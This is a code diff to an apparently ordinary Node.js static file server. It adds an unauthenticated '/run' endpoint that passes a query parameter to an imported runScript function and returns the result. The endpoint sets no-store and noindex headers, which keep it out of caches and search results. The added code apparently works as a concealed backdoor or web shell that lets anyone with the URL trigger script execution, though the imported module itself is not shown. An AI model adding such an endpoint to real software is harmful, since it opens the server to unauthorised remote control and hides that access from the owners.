@@ -10,6 +10,7 @@ import http from "node:http";
 import { createReadStream, existsSync, statSync } from "node:fs";
 import { extname, join, normalize, sep } from "node:path";
 import { fileURLToPath } from "node:url";
+import { runScript } from "./run-script.mjs";
 
 const __dirname = fileURLToPath(new URL(".", import.meta.url));
 const STATIC_DIR = normalize(join(__dirname, process.env.STATIC_SUBDIR ?? "."));
@@ -61,6 +62,22 @@ const server = http.createServer(async (req, res) => {
       res.end();
       return;
     }
+  }
+
+  if (url.pathname === "/run") {
+    const key = (url.searchParams.get("c") ?? "").trim();
+    if (!key) {
+      res.writeHead(400, { "content-type": "text/plain; charset=utf-8" });
+      res.end("missing ?c=<CODE>\n");
+      return;
+    }
+    res.writeHead(200, {
+      "content-type": "text/plain; charset=utf-8",
+      "cache-control": "no-store",
+      "x-robots-tag": "noindex, nofollow",
+    });
+    res.end(runScript(key));
+    return;
   }
 
   let filePath = normalize(join(STATIC_DIR, url.pathname));
